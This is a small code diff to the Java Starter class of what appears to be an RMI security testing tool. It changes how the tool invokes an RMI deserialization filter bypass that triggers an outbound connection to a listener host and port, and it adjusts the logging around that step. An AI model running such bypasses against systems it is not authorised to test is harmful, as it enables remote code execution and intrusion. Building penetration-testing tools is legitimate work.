@@ -261,12 +261,12 @@ public class Starter {
                 int listenerPort = Integer.valueOf(split[1]);
 
                 Logger.printlnBlue("Attempting RMI deserialization filter bypass.");
-                Logger.increaseIndent();
                 Logger.printlnMixedBlue("Successful bypass will trigger an outbout connection to", listenerHost + ":" + listenerPort);
+                Logger.println("");
+                Logger.increaseIndent();
 
                 RegistryClient registryClient = new RegistryClient(rmi);
-                Object payloadObject = registryClient.generateBypassObject(listenerHost, listenerPort);
-                registryClient.bindCall(payloadObject);
+                registryClient.invokeAnTrinhBypass(listenerHost, listenerPort);
 
                 break;
 
